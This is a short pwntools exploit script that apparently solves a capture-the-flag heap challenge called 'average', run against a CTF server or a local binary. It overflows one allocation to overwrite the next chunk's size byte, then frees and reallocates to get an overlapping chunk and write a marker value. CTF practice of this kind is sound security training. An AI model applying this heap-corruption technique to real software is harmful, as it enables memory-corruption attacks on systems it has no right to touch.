#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    # run with: python3 solve.py REMOTE
    r = remote("ahc.ctf.pascalctf.it", 9003 )
else:
    r = process("./average")

# Allocate 3 players (so that the 4'th player is adjacent to target)
# Then overflow the fourth player's to leak into last player's size
# The fifth allocation sends a request for a 0x50 chunk (closest)
# size in the free list / bin
for i in range(5):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(i).encode())
    r.sendlineafter(b'? ', b'0')
    
    r.sendlineafter(b'name: ', b'abcd' if i != 3 else b'a'*39)
    r.sendlineafter(b'message: ', b'efgh' if i != 3 else b'b'*32 + b'\x71')

# free last chunk, this puts the corrupted chunk into the correct bin
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b': ', b'4')

# create new chunk that overlaps with the target chunk 
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'4')
r.sendlineafter(b'? ', b'32')
r.sendlineafter(b'name: ', b'abcd')
r.sendlineafter(b'message: ', p64(0xdeadbeefcafebabe)*4)
r.sendlineafter(b'> ', b'5')
r.interactive()
